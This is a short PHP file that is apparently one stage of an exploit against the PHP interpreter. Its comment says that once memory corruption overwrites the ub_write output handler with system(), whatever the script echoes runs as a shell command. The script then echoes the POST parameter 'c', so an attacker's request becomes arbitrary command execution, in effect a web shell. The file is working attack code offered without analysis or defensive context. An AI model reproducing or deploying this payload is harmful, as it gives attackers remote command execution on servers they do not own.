<?php
// Dispatch echo: the first ub_write call after the corruption. Whatever this
// script writes to stdout becomes system()'s argument once ub_write is
// overwritten with the system address.
echo $_POST['c'] ?? "no c\n";
